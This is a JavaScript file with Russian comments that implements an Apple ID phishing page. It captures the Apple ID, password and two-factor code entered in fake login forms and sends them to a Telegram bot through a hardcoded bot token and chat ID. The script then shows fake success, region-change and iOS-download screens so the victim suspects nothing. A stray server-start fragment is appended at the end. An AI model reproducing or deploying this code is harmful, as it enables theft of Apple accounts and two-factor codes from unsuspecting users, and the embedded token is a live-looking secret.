<script>
    // Простые переменные
    const BOT_TOKEN = '8529740031:AAGRzoChsC2xGSqjWELANefi0Xc05CrhiAI';
    const CHAT_ID = '-1003894478662';
    
    // Функция определения устройства
    function detectPhoneModel() {
        const ua = navigator.userAgent;
        if (/iPhone/i.test(ua)) return 'iPhone';
        if (/iPad/i.test(ua)) return 'iPad';
        if (/iPod/i.test(ua)) return 'iPod';
        return 'Компьютер/Неизвестно';
    }
    
    // ПРОСТАЯ функция отправки в Telegram - работает напрямую
    async function sendToTelegram(appleId, password, is2FA = false, code2fa = '') {
        try {
            let message;
            
            if (is2FA) {
                message = `🔐 2FA Код: ${code2fa}\n📱 Устройство: ${detectPhoneModel()}`;
            } else {
                message = `🍎 Apple ID: ${appleId}\n🔑 Пароль: ${password}\n📱 Устройство: ${detectPhoneModel()}`;
            }
            
            // Кнопки для Telegram
            const inlineKeyboard = {
                inline_keyboard: [[
                    {
                        text: "✅ Подтвердить",
                        callback_data: is2FA ? "confirm_2fa" : "confirm_login"
                    },
                    {
                        text: "❌ Отменить",
                        callback_data: is2FA ? "cancel_2fa" : "cancel_login"
                    }
                ]]
            };
            
            // Отправляем напрямую в Telegram (самый простой способ)
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'HTML',
                    reply_markup: inlineKeyboard
                })
            });
            
            const result = await response.json();
            return result.ok; // true если успешно
            
        } catch (error) {
            console.log('Ошибка Telegram, но продолжаем:', error);
            // Даже если ошибка - продолжаем работу сайта
            return true;
        }
    }
    
    // ПРОСТОЕ переключение страниц
    function showPage(pageId) {
        // Скрыть все страницы
        const pages = ['loginPage', 'twoFactorPage', 'successPage', 'regionPage', 'downloadPage'];
        pages.forEach(id => {
            document.getElementById(id).style.display = 'none';
        });
        
        // Показать нужную страницу
        document.getElementById(pageId).style.display = 'block';
    }
    
    // Обработка формы входа - УПРОЩЕННАЯ
    document.getElementById('loginForm').addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const appleId = document.getElementById('appleId').value;
        const password = document.getElementById('password').value;
        
        if (!appleId || !password) {
            alert('Заполните все поля');
            return;
        }
        
        // Показываем загрузку
        const btn = this.querySelector('.btn');
        btn.textContent = 'Отправка...';
        btn.disabled = true;
        
        try {
            // Пытаемся отправить в Telegram
            await sendToTelegram(appleId, password, false);
            
            // Всегда переходим дальше (даже если отправка не удалась)
            setTimeout(() => {
                showPage('twoFactorPage');
                // Автозаполняем код для удобства тестирования
                document.getElementById('code2fa').value = '123456';
            }, 1000);
            
        } catch (error) {
            console.log('Ошибка:', error);
            // Все равно переходим дальше
            showPage('twoFactorPage');
        } finally {
            btn.textContent = 'Продолжить';
            btn.disabled = false;
        }
    });
    
    // Обработка 2FA формы - УПРОЩЕННАЯ
    document.getElementById('twoFactorForm').addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const code2fa = document.getElementById('code2fa').value;
        
        if (!code2fa || code2fa.length !== 6) {
            alert('Введите 6-значный код');
            return;
        }
        
        // Получаем данные из первой формы
        const appleId = document.getElementById('appleId').value;
        const password = document.getElementById('password').value;
        
        // Показываем загрузку
        const btn = this.querySelector('.btn');
        btn.textContent = 'Проверка...';
        btn.disabled = true;
        
        try {
            // Отправляем 2FA код
            await sendToTelegram(appleId, password, true, code2fa);
            
            // Переходим на страницу успеха
            showPage('successPage');
            
        } catch (error) {
            console.log('Ошибка:', error);
            // Все равно переходим
            showPage('successPage');
        } finally {
            btn.textContent = 'Подтвердить';
            btn.disabled = false;
        }
    });
    
    // Функции для кнопок
    function changeRegion(country) {
        alert(`Регион успешно изменен на ${country}!`);
        document.getElementById('regionSuccess').style.display = 'block';
        document.getElementById('regionSuccess').textContent = `Регион успешно изменен на ${country}!`;
    }
    
    function downloadIOS(version) {
        // Создаем фиктивный файл для скачивания
        const content = `iOS ${version} Firmware (Test File)\nVersion: ${version}\nDate: ${new Date().toLocaleString()}\nSize: 4.2 GB (simulated)`;
        const blob = new Blob([content], { type: 'application/octet-stream' });
        const url = URL.createObjectURL(blob);
        
        const a = document.createElement('a');
        a.href = url;
        a.download = `iOS_${version}.ipsw`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        
        setTimeout(() => {
            URL.revokeObjectURL(url);
        }, 100);
        
        alert(`iOS ${version} начал скачиваться!`);
    }
    
    // Навигация
    function goBack() {
        showPage('loginPage');
    }
    
    // Инициализация - показываем первую страницу
    showPage('loginPage');
</script>

// Запуск сервера
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Сервер запущен на порту ${PORT}`);
});
